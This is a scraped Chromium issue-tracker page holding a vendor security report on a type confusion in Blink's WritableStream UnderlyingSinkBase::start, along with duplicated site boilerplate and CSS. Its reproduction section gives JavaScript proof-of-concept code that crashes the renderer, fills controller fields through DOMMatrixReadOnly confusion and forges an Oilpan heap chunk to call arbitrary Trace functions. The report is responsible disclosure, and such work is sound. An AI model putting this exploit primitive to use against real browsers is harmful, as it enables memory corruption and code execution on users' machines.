        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br>When constructing WritableStreams, UnderlyingSinkBase can be exposed<span class="line"><!---->When constructing WritableStreams, UnderlyingSinkBase can be exposed<!----></span><br>by setting getter for "type" [ref-wr], and UnderlyingSinkBase::start<span class="line"><!---->by setting getter for "type" [ref-wr], and UnderlyingSinkBase::start<!----></span><br>accepts arbitrary v8 value as argument, which is converted to<span class="line"><!---->accepts arbitrary v8 value as argument, which is converted to<!----></span><br>WritableStreamDefaultController without type checks [ref-vuln].<span class="line"><!---->WritableStreamDefaultController without type checks [ref-vuln].<!----></span><br><br>  ScriptPromise start(ScriptState* script_state,<span class="line"><!---->  ScriptPromise start(ScriptState* script_state,<!----></span><br>                      ScriptValue controller,<span class="line"><!---->                      ScriptValue controller,<!----></span><br>                      ExceptionState& exception_state) {<span class="line"><!---->                      ExceptionState&amp; exception_state) {<!----></span><br>    controller_ = WritableStreamDefaultController::From(controller); <--<span class="line"><!---->    controller_ = WritableStreamDefaultController::From(controller); &lt;--<!----></span><br>    return start(script_state, controller_, exception_state);<span class="line"><!---->    return start(script_state, controller_, exception_state);<!----></span><br>  }<span class="line"><!---->  }<!----></span><br><br>This allows setting the `controller_` field to an arbitrary pointer.<span class="line"><!---->This allows setting the `controller_` field to an arbitrary pointer.<!----></span><br><br>Note that UnderlyingSourceBase also have the same pattern, but I couldn't get that object,<span class="line"><!---->Note that UnderlyingSourceBase also have the same pattern, but I couldn't get that object,<!----></span><br>because "type" are already defined there.<span class="line"><!---->because "type" are already defined there.<!----></span><br><br>[ref-wr]: <span class="line"><!---->[ref-wr]: <!----></span>https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/writable_stream.cc;l=926;drc=516f8d8dd33f3c7eb7554be8c43d5e238a743482<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/writable_stream.cc;l=926;drc=516f8d8dd33f3c7eb7554be8c43d5e238a743482"><!---->https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/writable_stream.cc;l=926;drc=516f8d8dd33f3c7eb7554be8c43d5e238a743482<!----></a><br>[ref-vuln]: <span class="line"><!---->[ref-vuln]: <!----></span>https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/underlying_sink_base.h;l=44;drc=052831f0220b79fe0c3343b49f6d2863ea6de05d<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/underlying_sink_base.h;l=44;drc=052831f0220b79fe0c3343b49f6d2863ea6de05d"><!---->https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/underlying_sink_base.h;l=44;drc=052831f0220b79fe0c3343b49f6d2863ea6de05d<!----></a><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br>Chrome Version: 95.0.4638.54 stable<span class="line"><!---->Chrome Version: 95.0.4638.54 stable<!----></span><br>Operating System: Windows 10 21H1 x64<span class="line"><!---->Operating System: Windows 10 21H1 x64<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br>1. The following code (min.html) crashes on 0x828282 because it tries to interpret a Smi value as object pointer:<span class="line"><!---->1. The following code (min.html) crashes on 0x828282 because it tries to interpret a Smi value as object pointer:<!----></span><br><br>  Object.prototype.__defineGetter__('type', function() {<span class="line"><!---->  Object.prototype.__defineGetter__('type', function() {<!----></span><br>      this.start(0x414141) // crashes on: 0x828282<span class="line"><!---->      this.start(0x414141) // crashes on: 0x828282<!----></span><br>  })<span class="line"><!---->  })<!----></span><br>  generator = new MediaStreamTrackGenerator('video')<span class="line"><!---->  generator = new MediaStreamTrackGenerator('video')<!----></span><br>  const wr = generator.writable<span class="line"><!---->  const wr = generator.writable<!----></span><br><br>2. The following code for the getter above fills all members of WritableStreamDefaultController<span class="line"><!---->2. The following code for the getter above fills all members of WritableStreamDefaultController<!----></span><br>with arbitrary value by confusing with DOMMatrixReadOnly.<span class="line"><!---->with arbitrary value by confusing with DOMMatrixReadOnly.<!----></span><br><br>  f64 = new Float64Array(16)<span class="line"><!---->  f64 = new Float64Array(16)<!----></span><br>  (new BigInt64Array(f64.buffer)).fill(0x41414141)<span class="line"><!---->  (new BigInt64Array(f64.buffer)).fill(0x41414141)<!----></span><br>  this.start(new DOMMatrixReadOnly(f64))<span class="line"><!---->  this.start(new DOMMatrixReadOnly(f64))<!----></span><br><br>Given an information leak such as <span class="line"><!---->Given an information leak such as <!----></span>crbug.com/1144662<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1144662" title="Bypassing ASLR using Oilpan’s conservative garbage collector"><!---->crbug.com/1144662<!----></a>, it's possible<span class="line"><!---->, it's possible<!----></span><br>to call an arbitrary function using this primitive.<span class="line"><!---->to call an arbitrary function using this primitive.<!----></span><br><br>3. Since there are multiple Member<> oilpan pointers in the target object, we can confuse<span class="line"><!---->3. Since there are multiple Member&lt;&gt; oilpan pointers in the target object, we can confuse<!----></span><br>it with a DOMArrayBufferView; it has the base pointer, offset, and length (DOMUint8Array).<span class="line"><!---->it with a DOMArrayBufferView; it has the base pointer, offset, and length (DOMUint8Array).<!----></span><br><br>We set offset=length=0, and base pointer becomes a Member<> by type confusion, which is Traced later.<span class="line"><!---->We set offset=length=0, and base pointer becomes a Member&lt;&gt; by type confusion, which is Traced later.<!----></span><br>The following code creates a fake oilpan chunk.<span class="line"><!---->The following code creates a fake oilpan chunk.<!----></span><br><br>size=0x18; // size of the object<span class="line"><!---->size=0x18; // size of the object<!----></span><br>index=520; // GCInfoIndex<span class="line"><!---->index=520; // GCInfoIndex<!----></span><br>in_construction=1;<span class="line"><!---->in_construction=1;<!----></span><br>marked=0;<span class="line"><!---->marked=0;<!----></span><br>// u32 is followed by a, there's no gap between them<span class="line"><!---->// u32 is followed by a, there's no gap between them<!----></span><br>// So a[-1] becomes HeapObjectHeader of &u32.data()<span class="line"><!---->// So a[-1] becomes HeapObjectHeader of &amp;u32.data()<!----></span><br>(a=new BigInt64Array(0x10>>2)).fill(BigInt(((size/8)<<17)|(marked<<16)|(index<<2)|(0<<1)|in_construction)<<32n)<span class="line"><!---->(a=new BigInt64Array(0x10&gt;&gt;2)).fill(BigInt(((size/8)&lt;&lt;17)|(marked&lt;&lt;16)|(index&lt;&lt;2)|(0&lt;&lt;1)|in_construction)&lt;&lt;32n)<!----></span><br>u32 = new BigInt64Array(0x10>>2)<span class="line"><!---->u32 = new BigInt64Array(0x10&gt;&gt;2)<!----></span><br>u32.fill(0n);<span class="line"><!---->u32.fill(0n);<!----></span><br>// Get DOMArrayBufferView-based Uint8Array, not just plain Uint8Array<span class="line"><!---->// Get DOMArrayBufferView-based Uint8Array, not just plain Uint8Array<!----></span><br>u8=(new MIDIMessageEvent('',{data:new Uint8Array(u32.buffer,0,0)})).data<span class="line"><!---->u8=(new MIDIMessageEvent('',{data:new Uint8Array(u32.buffer,0,0)})).data<!----></span><br>// Trigger<span class="line"><!---->// Trigger<!----></span><br>this.start(u8)<span class="line"><!---->this.start(u8)<!----></span><br>// GC<span class="line"><!---->// GC<!----></span><br>new ArrayBuffer(0x10000000)<span class="line"><!---->new ArrayBuffer(0x10000000)<!----></span><br><br>By changing index, we can call any Trace function on u32.data().<span class="line"><!---->By changing index, we can call any Trace function on u32.data().<!----></span><br>Also we can see a[-1] changed because of marking.<span class="line"><!---->Also we can see a[-1] changed because of marking.<!----></span><br><br>FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION<b class="line"><!---->FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION<!----></b><br>Type of crash: tab<span         *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

        for LitElement.

      <style>
        mr-issue-page {

        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;

          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;

            width: 100%;
            padding: 0;
            border: 0;
          }

            width: 100%;

          justify-content: flex-start;
          align-items: stretch;
        }
        mr-launch-overview[hidden] {
          display: none;
        }
        mr-phase {
          margin-bottom: 0.75em;
        }
      </style>

  :host {
    --mr-edit-field-padding: 0.125em 4px;

  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;

    /* Links that look like buttons. */

    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.

          Issue tracker keyboard shortcuts
          
            Close
          <button class="close-button">
            Close
          </button>
        <h2>
          Issue tracker keyboard shortcuts
          <button class="close-button">
            Close
          </button>
        </h2>
        
          
            
              <span></span>Issue list<span class="help-title"><!---->Issue list<!----></span>
              
                
                  
                    k<kbd><!---->k<!----></kbd>
                     / <span class="key-separator"> / </span>
                  
                    j<kbd><!---->j<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->k<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->j<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                up/down in the list<span class="key-tip"><!---->up/down in the list<!----></span>
              
                
                  
                    o<kbd><!---->o<!----></kbd>
                     / <span class="key-separator"> / </span>
                  
                    Enter<kbd><!---->Enter<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->

        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>
      
      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>

        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>

          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br>When constructing WritableStreams, UnderlyingSinkBase can be exposed<span class="line"><!---->When constructing WritableStreams, UnderlyingSinkBase can be exposed<!----></span><br>by setting getter for "type" [ref-wr], and UnderlyingSinkBase::start<span class="line"><!---->by setting getter for "type" [ref-wr], and UnderlyingSinkBase::start<!----></span><br>accepts arbitrary v8 value as argument, which is converted to<span class="line"><!---->accepts arbitrary v8 value as argument, which is converted to<!----></span><br>WritableStreamDefaultController without type checks [ref-vuln].<span class="line"><!---->WritableStreamDefaultController without type checks [ref-vuln].<!----></span><br><br>  ScriptPromise start(ScriptState* script_state,<span class="line"><!---->  ScriptPromise start(ScriptState* script_state,<!----></span><br>                      ScriptValue controller,<span class="line"><!---->                      ScriptValue controller,<!----></span><br>                      ExceptionState& exception_state) {<span class="line"><!---->                      ExceptionState&amp; exception_state) {<!----></span><br>    controller_ = WritableStreamDefaultController::From(controller); <--<span class="line"><!---->    controller_ = WritableStreamDefaultController::From(controller); &lt;--<!----></span><br>    return start(script_state, controller_, exception_state);<span class="line"><!---->    return start(script_state, controller_, exception_state);<!----></span><br>  }<span class="line"><!---->  }<!----></span><br><br>This allows setting the `controller_` field to an arbitrary pointer.<span class="line"><!---->This allows setting the `controller_` field to an arbitrary pointer.<!----></span><br><br>Note that UnderlyingSourceBase also have the same pattern, but I couldn't get that object,<span class="line"><!---->Note that UnderlyingSourceBase also have the same pattern, but I couldn't get that object,<!----></span><br>because "type" are already defined there.<span class="line"><!---->because "type" are already defined there.<!----></span><br><br>[ref-wr]: <span class="line"><!---->[ref-wr]: <!----></span>https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/writable_stream.cc;l=926;drc=516f8d8dd33f3c7eb7554be8c43d5e238a743482<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/writable_stream.cc;l=926;drc=516f8d8dd33f3c7eb7554be8c43d5e238a743482"><!---->https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/writable_stream.cc;l=926;drc=516f8d8dd33f3c7eb7554be8c43d5e238a743482<!----></a><br>[ref-vuln]: <span class="line"><!---->[ref-vuln]: <!----></span>https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/underlying_sink_base.h;l=44;drc=052831f0220b79fe0c3343b49f6d2863ea6de05d<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/underlying_sink_base.h;l=44;drc=052831f0220b79fe0c3343b49f6d2863ea6de05d"><!---->https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/underlying_sink_base.h;l=44;drc=052831f0220b79fe0c3343b49f6d2863ea6de05d<!----></a><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br>Chrome Version: 95.0.4638.54 stable<span class="line"><!---->Chrome Version: 95.0.4638.54 stable<!----></span><br>Operating System: Windows 10 21H1 x64<span class="line"><!---->Operating System: Windows 10 21H1 x64<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br>1. The following code (min.html) crashes on 0x828282 because it tries to interpret a Smi value as object pointer:<span class="line"><!---->1. The following code (min.html) crashes on 0x828282 because it tries to interpret a Smi value as object pointer:<!----></span><br><br>  Object.prototype.__defineGetter__('type', function() {<span class="line"><!---->  Object.prototype.__defineGetter__('type', function() {<!----></span><br>      this.start(0x414141) // crashes on: 0x828282<span class="line"><!---->      this.start(0x414141) // crashes on: 0x828282<!----></span><br>  })<span class="line"><!---->  })<!----></span><br>  generator = new MediaStreamTrackGenerator('video')<span class="line"><!---->  generator = new MediaStreamTrackGenerator('video')<!----></span><br>  const wr = generator.writable<span class="line"><!---->  const wr = generator.writable<!----></span><br><br>2. The following code for the getter above fills all members of WritableStreamDefaultController<span class="line"><!---->2. The following code for the getter above fills all members of WritableStreamDefaultController<!----></span><br>with arbitrary value by confusing with DOMMatrixReadOnly.<span class="line"><!---->with arbitrary value by confusing with DOMMatrixReadOnly.<!----></span><br><br>  f64 = new Float64Array(16)<span class="line"><!---->  f64 = new Float64Array(16)<!----></span><br>  (new BigInt64Array(f64.buffer)).fill(0x41414141)<span class="line"><!---->  (new BigInt64Array(f64.buffer)).fill(0x41414141)<!----></span><br>  this.start(new DOMMatrixReadOnly(f64))<span class="line"><!---->  this.start(new DOMMatrixReadOnly(f64))<!----></span><br><br>Given an information leak such as <span class="line"><!---->Given an information leak such as <!----></span>crbug.com/1144662<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1144662" title="Bypassing ASLR using Oilpan’s conservative garbage collector"><!---->crbug.com/1144662<!----></a>, it's possible<span class="line"><!---->, it's possible<!----></span><br>to call an arbitrary function using this primitive.<span class="line"><!---->to call an arbitrary function using this primitive.<!----></span><br><br>3. Since there are multiple Member<> oilpan pointers in the target object, we can confuse<span class="line"><!---->3. Since there are multiple Member&lt;&gt; oilpan pointers in the target object, we can confuse<!----></span><br>it with a DOMArrayBufferView; it has the base pointer, offset, and length 